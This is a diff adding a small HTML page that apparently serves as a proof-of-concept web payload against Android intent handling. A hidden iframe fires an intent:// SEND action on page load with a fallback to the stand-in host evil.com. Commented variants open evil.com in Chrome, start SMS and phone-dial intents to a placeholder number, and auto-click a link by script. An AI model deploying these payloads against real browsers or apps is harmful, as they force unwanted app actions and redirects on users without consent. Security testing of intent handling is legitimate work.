@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title></title>
+  </head>
+  <body>
+    <!--<a href="intent://evil.com#Intent;scheme=http;package=com.android.chrome;end"></a>-->
+    <!--<a href="intent://#Intent;scheme=http;type=text/plain;action=android.intent.action.SEND;S.browser_fallback_url=http://evil.com;end"></a>-->
+    <!--<a href="intent://send/+001122334455#Intent;scheme=smsto;action=android.intent.action.SENDTO;end"></a>-->
+    <!---<a href="intent://send/+001122334455#Intent;scheme=tel;action=android.intent.action.DIAL;end"></a>-->
+    <iframe src="intent://#Intent;type=text/plain;action=android.intent.action.SEND;S.browser_fallback_url=http://evil.com;end" width="" height=""></iframe>
+    <!--or if the iframe doesn't work :
+    <script type="text/javascript">
+      document.getElementsByTagName("A")[0].click();
+    </script>
+  -->
+  </body>
+</html>
